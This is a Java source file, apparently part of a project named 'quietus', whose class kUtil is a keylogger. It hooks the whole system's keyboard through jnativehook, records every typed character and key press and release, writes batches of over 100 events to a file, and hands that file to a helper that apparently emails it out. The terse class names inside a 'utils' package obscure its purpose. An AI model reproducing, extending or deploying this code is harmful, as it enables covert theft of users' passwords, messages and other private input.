package com.quietus.utils;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;

class kUtil implements NativeKeyListener, Runnable {

    private final List<String> typedList = new ArrayList<>();
    private final List<String> typedListv2 = new ArrayList<>();
    private final List<String> currentlyPressed = new ArrayList<>();
    private volatile String beingHeld = "";
    private volatile int writing = 0;

    public void nativeKeyTyped(NativeKeyEvent e) {

        while (writing == 1) {

            Thread.onSpinWait();

        }

        char kTyped;
        kTyped = e.getKeyChar();
        String charTostr;
        charTostr = String.valueOf(kTyped);
        typedListv2.add(charTostr);

    }

    public void nativeKeyPressed(NativeKeyEvent e) {

        while (writing == 1){

            Thread.onSpinWait();

        }

        String key = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (!beingHeld.equals(key)) {

            beingHeld = key;
            currentlyPressed.add(key);

        }

        typedList.add("[" + key + " DOWN] ");

    }




    public void nativeKeyReleased(NativeKeyEvent e) {

        while (writing == 1){

            Thread.onSpinWait();

        }

        String key = NativeKeyEvent.getKeyText(e.getKeyCode());

        currentlyPressed.remove(key);

        typedList.add("[" + key + " UP] ");

        ListIterator<String> typedIterator = typedList.listIterator();
        ListIterator<String> typedIteratorv2 = typedListv2.listIterator();
        String textMemory = "";

        if (typedList.size() > 100 && currentlyPressed.size() == 0 && writing == 0){

            writing = 1;

            while (typedIteratorv2.hasNext()){

                textMemory = textMemory + typedIteratorv2.next();

            }

            textMemory = textMemory + System.lineSeparator() + System.lineSeparator();

            while (typedIterator.hasNext()){

                textMemory = textMemory + typedIterator.next();

            }
            try {
                wUtil write = new wUtil();
                String fileName = write.textWrite(textMemory);

                pUtil posting = new pUtil();
                posting.mailing(fileName);

            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
            typedList.clear();
            typedListv2.clear();
            writing = 0;
        }

    }

    @Override
    public void run(){

        kUtil klog = new kUtil();
        GlobalScreen.addNativeKeyListener(klog);

    }

}
